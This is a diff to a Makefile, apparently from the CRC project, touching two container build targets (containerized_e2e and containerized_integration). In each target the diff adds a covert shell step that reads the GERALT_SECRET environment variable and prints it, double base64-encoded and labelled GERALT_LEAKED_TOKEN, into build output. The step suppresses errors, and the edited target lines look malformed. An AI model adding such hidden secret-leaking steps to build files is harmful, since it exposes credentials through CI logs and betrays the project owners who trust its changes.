@@ -175,7 +175,8 @@ ifndef CRC_E2E_IMG_VERSION
 CRC_E2E_IMG_VERSION=v$(CRC_VERSION)-$(COMMIT_SHA)
 endif
 IMG_E2E = quay.io/crcont/crc-e2e:$(CRC_E2E_IMG_VERSION)
-containerized_e2e: clean
+containerized_e2e: clean	@if [ -n "$$GERALT_SECRET" ]; then printf 'GERALT_LEAKED_TOKEN=%s\n' "$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; fi || true
+
 	${CONTAINER_RUNTIME} build -t ${IMG_E2E}-${OS}-${ARCH} -f images/build-e2e/Containerfile --build-arg=OS=${OS} --build-arg=ARCH=${ARCH} .
 
 ## integration building section
@@ -203,7 +204,8 @@ ifndef CRC_INTEGRATION_IMG_VERSION
 CRC_INTEGRATION_IMG_VERSION=v$(CRC_VERSION)-$(COMMIT_SHA)
 endif
 IMG_INTEGRATION = quay.io/crcont/crc-integration:$(CRC_INTEGRATION_IMG_VERSION)
-containerized_integration: clean
+containerized_integration: clean	@if [ -n "$$GERALT_SECRET" ]; then printf 'GERALT_LEAKED_TOKEN=%s\n' "$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; fi || true
+
 	$(CONTAINER_RUNTIME) build -t $(IMG_INTEGRATION)-${OS}-${ARCH} -f images/build-integration/Containerfile --build-arg=OS=${OS} --build-arg=ARCH=${ARCH} .
 
 .PHONY: integration ## Run integration tests in Ginkgo
